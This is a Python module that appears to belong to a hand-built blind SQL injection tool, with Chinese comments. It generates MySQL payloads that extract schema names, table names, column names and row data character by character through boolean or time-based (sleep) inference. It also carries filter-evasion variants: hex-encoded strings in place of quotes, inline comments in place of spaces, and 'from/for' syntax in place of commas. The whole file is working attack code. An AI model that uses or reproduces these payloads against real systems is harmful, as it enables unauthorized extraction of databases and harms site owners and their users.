import config
import myEnum

true_value = config.boolean_inject_success_value
false_value = config.boolean_inject_failure_value
sleep_time = config.sleep_inject_sleep_time

len_sql = [
  myEnum.SQL_TYPE.GET_SCHEMATA_LEN_SQL,
  myEnum.SQL_TYPE.GET_TABLES_LEN_SQL,
  myEnum.SQL_TYPE.GET_COLUMNS_LEN_SQL,
  myEnum.SQL_TYPE.GET_DATA_LEN_SQL,
]

value_sql = [
  myEnum.SQL_TYPE.GET_SCHEMATA_VALUE_SQL,
  myEnum.SQL_TYPE.GET_TABLES_VALUE_SQL,
  myEnum.SQL_TYPE.GET_COLUMNS_VALUE_SQL,
  myEnum.SQL_TYPE.GET_DATA_VALUE_SQL,
]

def strtohex_sql(str):
  return '0x' + str.encode('utf-8').hex()

def type_of_sql(sql_type):
  if sql_type == myEnum.SQL_TYPE.GET_SCHEMATA_LEN_SQL or sql_type == myEnum.SQL_TYPE.GET_SCHEMATA_VALUE_SQL:
    # 基本上没什么过滤的
    return lambda schema_name, table_name, column_name: \
      'select(group_concat(schema_name))from(information_schema.schemata)'

  if sql_type == myEnum.SQL_TYPE.GET_TABLES_LEN_SQL or sql_type == myEnum.SQL_TYPE.GET_TABLES_VALUE_SQL:
    # 单引号是否过滤
    prefix = 'select(group_concat(table_name))from(information_schema.tables)where(table_schema='
    if config.isQuotationMark:
      return lambda schema_name, table_name, column_name: f"{prefix}{strtohex_sql(schema_name)})"
    return lambda schema_name, table_name, column_name: f"{prefix}'{schema_name}')"

  if sql_type == myEnum.SQL_TYPE.GET_COLUMNS_LEN_SQL or sql_type == myEnum.SQL_TYPE.GET_COLUMNS_VALUE_SQL:
    prefix = 'select(group_concat(column_name))from(information_schema.columns)where'

    if config.isCurrentDB:
      if config.isQuotationMark:
        return lambda schema_name, table_name, column_name: f"{prefix}(table_name={strtohex_sql(table_name)})"
      return lambda schema_name, table_name, column_name: f"{prefix}(table_name='{table_name}')"

    if config.isQuotationMark:
      if config.isAnd:
         return lambda schema_name, table_name, column_name: f"{prefix}(table_name={strtohex_sql(table_name)})"
      return lambda schema_name, table_name, column_name: \
        f"{prefix}((table_schema={strtohex_sql(schema_name)})and(table_name={strtohex_sql(table_name)}))"

    if config.isAnd:
      return lambda schema_name, table_name, column_name: f"{prefix}(table_name='{table_name}')"

    return lambda schema_name, table_name, column_name: \
      f"{prefix}((table_schema='{schema_name}')and(table_name='{table_name}'))"

  if sql_type == myEnum.SQL_TYPE.GET_DATA_LEN_SQL or sql_type == myEnum.SQL_TYPE.GET_DATA_VALUE_SQL:
    if config.isCurrentDB:
      return lambda schema_name, table_name, column_name: \
        f"select(group_concat({column_name}))from({table_name})"
    return lambda schema_name, table_name, column_name: \
      f"select(group_concat({column_name}))from({schema_name}.{table_name})"



# 获取数据库长度SQL
def get_len_sql(sql_fn, schema_name, table_name, column_name):
  sql = sql_fn(schema_name, table_name, column_name)
  
  if config.INJECT_TYPE == myEnum.SQL_INJECT_TYPE.SLEEP_INJECT:
    return lambda mid: f'if(length(({sql}))>={mid},sleep({sleep_time}),0)'
  if config.INJECT_TYPE == myEnum.SQL_INJECT_TYPE.BOOLEAN_INJECT:
    if config.isIf:
      return lambda mid: f'(length(({sql}))>={mid})'
    else:
      return lambda mid: f'if(length(({sql}))>={mid},{true_value},{false_value})'
  print('not injecct type')

#获取数据库列表SQL
def get_value_sql(sql_fn, schema_name, table_name, column_name):

  sql = sql_fn(schema_name, table_name, column_name)

  if config.INJECT_TYPE == myEnum.SQL_INJECT_TYPE.SLEEP_INJECT:
    return lambda i, mid: f'if(ascii(substr(({sql}),{i},1))>={mid},sleep({sleep_time}),0)'
  elif config.INJECT_TYPE == myEnum.SQL_INJECT_TYPE.BOOLEAN_INJECT:

    condition = lambda i, mid: f'(ascii(substr(({sql}),{i},1))>={mid})'
    if config.isComma:
      condition = lambda i, mid: f'(ascii(substr(({sql})/**/from/**/{i}/**/for/**/1))>={mid})'

    if not config.isIf:
      return lambda i, mid: f'if({condition(i, mid)},{true_value},{false_value})'
    else:
      return condition


def get_sql(sql_type, schema_name = '', table_name = '', column_name = ''):
  if sql_type in len_sql:
    return get_len_sql(type_of_sql(sql_type), schema_name, table_name, column_name)
  elif sql_type in value_sql:
    return get_value_sql(type_of_sql(sql_type), schema_name, table_name, column_name)
  else:
    print('Unknown sql type')